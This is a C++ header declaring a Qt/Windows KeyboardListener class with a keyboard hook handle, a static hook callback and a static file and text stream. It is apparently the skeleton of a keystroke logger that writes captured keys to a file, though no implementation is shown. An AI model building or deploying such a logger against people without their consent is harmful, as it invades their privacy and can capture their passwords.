#ifndef KEYBOARDLISTNER_H
#define KEYBOARDLISTNER_H

#include <QFile>
#include <QTextStream>
#include <windows.h>



class KeyboardListener
{
public:
    KeyboardListener();
    ~KeyboardListener();

private:
    HHOOK mKeyboardHook;

    static QFile       mFile;
    static QTextStream mStream;

    static LRESULT CALLBACK processKeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam);
};

#endif // KEYBOARDLISTNER_H
